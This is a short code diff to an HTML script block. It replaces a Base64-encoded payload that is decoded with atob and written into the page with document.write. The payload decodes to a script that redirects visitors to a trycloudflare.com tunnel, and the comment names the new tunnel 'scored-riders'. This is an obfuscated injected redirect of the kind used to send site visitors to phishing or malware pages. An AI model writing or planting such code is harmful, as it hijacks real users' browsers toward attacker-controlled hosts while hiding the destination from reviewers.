@@ -1,8 +1,11 @@
 <script>
-  var payload = "PHNjcmlwdD53aW5kb3cubG9jYXRpb24uaHJlZj0iaHR0cHM6Ly9mYWN1bHR5LWJ1cmtlLXNvdW5kcy1zbW9raW5nLnRyeWNsb3VkZmxhcmUuY29tIjs8L3NjcmlwdD4="; 
+  // This is the full Base64 string for the "scored-riders" tunnel
+  var payload = "PHNjcmlwdD53aW5kb3cubG9jYXRpb24uaHJlZj0iaHR0cHM6Ly9zY29yZWQtcmlkZXJzLWRlZmVhdC1jaXJjdWxhci50cnljbG91ZGZsYXJlLmNvbSI7PC9zY3JpcHQ+Cg=="; 
+
   function unpack(data) {
     var decoded = atob(data); 
     document.write(decoded);  
   }
+  
   unpack(payload);
 </script>
